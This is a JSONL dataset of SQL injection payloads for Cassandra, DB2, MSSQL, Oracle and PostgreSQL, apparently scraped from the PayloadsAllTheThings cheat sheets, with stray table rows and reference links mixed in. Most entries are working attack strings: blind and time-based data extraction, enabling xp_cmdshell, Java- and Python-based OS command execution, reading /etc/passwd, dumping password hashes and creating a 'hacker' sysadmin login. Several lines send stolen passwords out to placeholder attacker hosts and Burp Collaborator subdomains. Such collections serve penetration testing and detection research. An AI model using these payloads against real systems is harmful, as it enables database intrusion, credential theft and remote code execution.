{"vulnerability_type": "sql_injection", "payload": "* Use a classic single quote to trigger an error: `'`", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| `' OR if(1/(length((select('a')))-1)=1,true,false) OR '` | Division by zero     |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "* Cassandra is a non-relational database, so CQL doesn't support `JOIN` or `UNION` statements, which makes cross-table queries more challenging.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "* Another limitation is the absence of the `OR` operator in CQL, which prevents creating always-true conditions; for instance, a query like `SELECT * FROM table WHERE col1='a' OR col2='b';` will be rejected.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "username: admin' ALLOW FILTERING; %00", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "username: admin'/*", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "password: */and pass>'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| DBMS version     | `select getvariable('sysibm.version') from sysibm.sysdummy1` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| List tables      | `SELECT tbname FROM sysibm.syscolumns WHERE name='username'` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Substring        | `select substr('abc',2,1) FROM sysibm.sysdummy1` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| CHAR to ASCII    | `select ascii('A') from sysibm.sysdummy1`  |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Heavy queries, if user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| List DBA accounts | `select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| List DBA accounts | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Location of DB files | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "- [Pentestmonkey's DB2 SQL Injection Cheat Sheet - @pentestmonkey - September 17, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Hostname        | `SELECT SERVERPROPERTY('productversion')` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Hostname        | `SELECT SERVERPROPERTY('productlevel')`   |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Hostname        | `SELECT SERVERPROPERTY('edition')`        |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "-- use xtype = 'V' for views", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT name FROM master..sysobjects WHERE xtype = 'U';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' + convert(int,@@version) + '", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' + cast((SELECT @@version) as int) + '", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT message FROM data WHERE row = 1 and message like 't%'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "ProductID=1;waitfor delay '0:0:10'--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "ProductID=1);waitfor delay '0:0:10'--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "ProductID=1';waitfor delay '0:0:10'--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "ProductID=1');waitfor delay '0:0:10'--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "ProductID=1));waitfor delay '0:0:10'--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT 'A'SELECT 'B'SELECT 'C'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "-- you won't have the output of the query, redirect it to a file", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "OPENROWSET(BULK 'C:\\path\\to\\file', SINGLE_CLOB)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "execute spWriteStringToFile 'contents', 'C:\\path\\to\\', 'file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXEC sp_configure 'show advanced options',1;", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXEC sp_configure 'xp_cmdshell',1;", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null))", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default)))", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default))", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "xp_dirtree '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "xp_fileexist '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "BACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "BACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "RESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "RESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "RESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "RESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "RESTORE LABELONLY FROM DISK = '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "RESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "RESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select version from openquery(\"linkedserver\", 'select @@version as version');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT * FROM fn_my_permissions(NULL, 'SERVER');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT * FROM fn_my_permissions (NULL, 'DATABASE');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name;", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT is_srvrolemember('sysadmin');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "-- 'sp_password' was found in the text of this event.", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "- [MSSQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';`  |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| DBMS version  | `SELECT banner FROM v$version WHERE banner LIKE 'TNS%';`     |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Hostname      | `SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;`     |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Database name | `SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Invalid XML           | `SELECT to_char(dbms_xmlgen.getxml('select \"'&#124;&#124;(select user from sys.dual)&#124;&#124;'\" FROM sys.dual')) FROM dual` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Invalid XML           | `SELECT rtrim(extract(xmlagg(xmlelement(\"s\", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| XDBURITYPE getblob    | `XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| XMLType               | `AND 1337=(SELECT UPPER(XMLType(CHR(60)\\|\\|CHR(58)\\|\\|'~'\\|\\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\\|\\|'~'\\|\\|CHR(62))) FROM DUAL) -- -` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| DBMS_UTILITY          | `AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\\|\\|(SELECT banner FROM v$version)\\|\\|'~') -- -` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "When the injection point is inside a string use : `'||PAYLOAD--`", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Version is 12.2\t       | `SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| Column message exists in table log_table | `SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| First letter of first message is t | `SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/\"> %remote;]>'),'/l') FROM dual", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c', 'dir >c:\\test.txt') FROM DUAL", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXECUTE IMMEDIATE 'create or replace and compile java source named \"PwnUtil\" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str += stemp + \"\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT os_command.exec_clob('<COMMAND>') cmd from dual", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "- [Oracle SQL Injection Cheat Sheet - @pentestmonkey - August 30, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| List Columns           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| CAST | `AND 1337=CAST('~'\\|\\|(SELECT version())::text\\|\\|'~' AS NUMERIC) -- -` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| CAST | `AND (CAST('~'\\|\\|(SELECT version())::text\\|\\|'~' AS NUMERIC)) -- -` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT database_to_xml(true,true,''); -- dump the current database to XML", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select pg_ls_dir('./');", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "select pg_read_file('PG_VERSION', 0, 200);", "source": "PayloadsAllTheThings"}
{"vulnerability_type": "sql_injection", "payload": "COPY temp FROM '/etc/passwd';", "source": "PayloadsAllTheThings"}
